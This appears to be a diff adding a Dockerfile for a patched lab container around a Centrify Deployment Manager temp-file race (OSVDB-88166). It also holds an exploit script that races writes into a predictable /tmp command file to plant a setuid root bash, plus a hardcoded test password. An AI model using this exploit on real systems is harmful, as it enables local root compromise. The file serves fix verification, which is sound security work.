@@ -1,0 +1,134 @@
+FROM debian:bookworm-slim
+
+# Install required packages (identical to vulnerable version)
+RUN apt-get update && apt-get install -y \
+    openssh-server \
+    sudo \
+    cron \
+    bash \
+    gcc \
+    libc6-dev \
+    inotify-tools \
+    passwd \
+    && rm -rf /var/lib/apt/lists/*
+
+# Setup SSH
+RUN mkdir -p /var/run/sshd && \
+    sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && \
+    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
+    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
+
+# Create low-privilege user
+RUN useradd -m -s /bin/bash testuser && \
+    echo 'testuser:t3stP@ss' | chpasswd
+
+# Create dzdo (kept for compatibility but not exploitable)
+RUN printf '%s\n' \
+    '#!/bin/bash' \
+    '# dzdo - Centrify sudo equivalent (simulated)' \
+    'exec sudo "$@"' > /usr/local/bin/dzdo && \
+    chmod 755 /usr/local/bin/dzdo
+
+# FIXED: Centrify Deployment Manager - uses mktemp for secure temp file creation,
+# verifies ownership, and uses a private directory instead of /tmp
+RUN cat <<'VULN_SCRIPT' > /usr/local/bin/centrify-deploy-mgr
+#!/bin/bash
+# FIXED Centrify Deployment Manager - secure temp file handling
+# Fix: Use mktemp with restrictive permissions in a root-owned directory
+
+SECUREDIR="/var/lib/centrify/tmp"
+mkdir -p "${SECUREDIR}"
+chmod 700 "${SECUREDIR}"
+chown root:root "${SECUREDIR}"
+
+CMDFILE=$(mktemp "${SECUREDIR}/centrify.cmd.XXXXXXXXXX")
+UUID1=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee")
+UUID2=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "ffffffff-1111-2222-3333-444444444444")
+
+# Verify we own the file and it's a regular file (not a symlink)
+if [ -L "${CMDFILE}" ] || [ "$(stat -c %u "${CMDFILE}")" != "0" ]; then
+    rm -f "${CMDFILE}"
+    exit 1
+fi
+
+echo "echo ${UUID1}" > "${CMDFILE}"
+echo "vmware -v 2> /dev/null |grep 'VMware ESX Server' >/dev/null" >> "${CMDFILE}"
+echo 'temp=$?' >> "${CMDFILE}"
+echo "echo ${UUID2}" >> "${CMDFILE}"
+echo 'exit ${temp}' >> "${CMDFILE}"
+
+chmod 700 "${CMDFILE}"
+
+/bin/bash "${CMDFILE}"
+rm -rf "${CMDFILE}"
+VULN_SCRIPT
+
+RUN chmod 755 /usr/local/bin/centrify-deploy-mgr && \
+    chown root:root /usr/local/bin/centrify-deploy-mgr
+
+# Create the secure directory
+RUN mkdir -p /var/lib/centrify/tmp && \
+    chmod 700 /var/lib/centrify/tmp && \
+    chown root:root /var/lib/centrify/tmp
+
+# FIXED: Remove the dangerous sudoers entry that allowed running arbitrary scripts from /tmp
+# No sudoers.d/centrify file is created
+
+# Create a service script (same structure but now safe)
+RUN cat <<'SERVICE_SCRIPT' > /usr/local/bin/centrify-service
+#!/bin/bash
+while true; do
+    /usr/local/bin/centrify-deploy-mgr >> /var/log/centrify-deploy.log 2>&1
+    sleep 30
+done
+SERVICE_SCRIPT
+RUN chmod 755 /usr/local/bin/centrify-service
+
+# Keep the exploit script for testing (it will fail)
+RUN cat <<'EXPLOIT_EOF' > /home/testuser/exploit.sh
+#!/bin/bash
+# Exploit for Centrify Deployment Manager v2.1.0.283 (OSVDB-88166)
+# This should FAIL on the fixed version
+
+CMDFILE="/tmp/centrify.cmd.0"
+
+echo "[*] Attempting Centrify exploit (should fail on fixed version)..."
+
+touch "${CMDFILE}" 2>/dev/null
+
+(while true; do
+    echo "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" >> "${CMDFILE}" 2>/dev/null
+done) &
+RACE_PID=$!
+
+for i in $(seq 1 60); do
+    if [ -f /tmp/rootbash ] && [ -u /tmp/rootbash ]; then
+        kill $RACE_PID 2>/dev/null
+        echo "[+] Exploit succeeded (unexpected on fixed version)"
+        exit 0
+    fi
+    sleep 1
+done
+
+kill $RACE_PID 2>/dev/null
+echo "[-] Exploit failed (expected on fixed version)"
+exit 1
+EXPLOIT_EOF
+
+RUN chown testuser:testuser /home/testuser/exploit.sh && \
+    chmod +x /home/testuser/exploit.sh
+
+# Startup script
+RUN cat <<'START_SCRIPT' > /usr/local/bin/start.sh
+#!/bin/bash
+/usr/local/bin/centrify-service &
+exec /usr/sbin/sshd -D
+START_SCRIPT
+RUN chmod 755 /usr/local/bin/start.sh
+
+# Verify fix: no sudoers entry for /tmp scripts
+RUN test ! -f /etc/sudoers.d/centrify && \
+    echo "FIXED: No dangerous sudoers entry for /tmp scripts"
+
+EXPOSE 22
+CMD ["/usr/local/bin/start.sh"]
